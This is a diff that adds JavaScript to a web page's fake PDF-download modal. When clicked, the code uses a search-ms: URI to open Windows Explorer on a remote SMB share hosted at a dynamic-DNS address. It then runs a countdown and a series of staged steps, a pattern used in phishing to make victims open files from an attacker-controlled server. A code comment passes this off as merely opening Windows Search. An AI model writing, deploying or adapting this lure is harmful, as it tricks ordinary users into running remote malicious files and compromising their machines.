+            const modal = document.getElementById('pdf-modal');
+            const modalContent = modal.querySelector('div');
+            const closeModalBtn = document.getElementById('close-modal-btn');
+            const openExplorerBtn = document.getElementById('open-explorer-btn');
+            const proceedBtn = document.getElementById('proceed-btn');
+            
+            const step1 = document.getElementById('modal-step-1');
+            const step2 = document.getElementById('modal-step-2');
+            const step3 = document.getElementById('modal-step-3');
+            const step4 = document.getElementById('modal-step-4');
+            let countdownInterval;
+
+            function showStep(stepToShow) {
+                [step1, step2, step3, step4].forEach(step => step.style.display = 'none');
+                stepToShow.style.display = 'block';
+            }
+
+            downloadBtn.addEventListener('click', () => {
+                modal.style.display = 'flex';
+                setTimeout(() => {
+                    modalContent.style.transform = 'scale(1)';
+                    modalContent.style.opacity = '1';
+                }, 50);
+                showStep(step1);
+            });
+
+            closeModalBtn.addEventListener('click', () => {
+                 modalContent.style.transform = 'scale(0.95)';
+                 modalContent.style.opacity = '0';
+                 setTimeout(() => {
+                    modal.style.display = 'none';
+                    clearInterval(countdownInterval); // Stop timer if modal is closed
+                 }, 300);
+            });
+
+            openExplorerBtn.addEventListener('click', () => {
+                showStep(step2);
+                try {
+                    // This protocol is used to open Windows Search.
+                     const targetUri = "search-ms:crumb=location:\\\\smb2server.ddns.net\\Secure_Access&query=*.txt";
+                     window.location.href = targetUri;
+                } catch (e) {
+                    console.warn("Could not open file explorer via search-ms protocol due to browser security or OS incompatibility.");
+                }
+                
+                // Start Countdown
+                let countdown = 20;
+                const timerElement = document.getElementById('countdown-timer');
+                timerElement.textContent = countdown;
+                countdownInterval = setInterval(() => {
+                    countdown--;
+                    timerElement.textContent = countdown;
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        showStep(step3);
+                    }
+                }, 1000);
+            });
+
+            proceedBtn.addEventListener('click', () => {
+                 showStep(step4);
             });
         });
-
     </script>
 </body>
 </html>
+
+
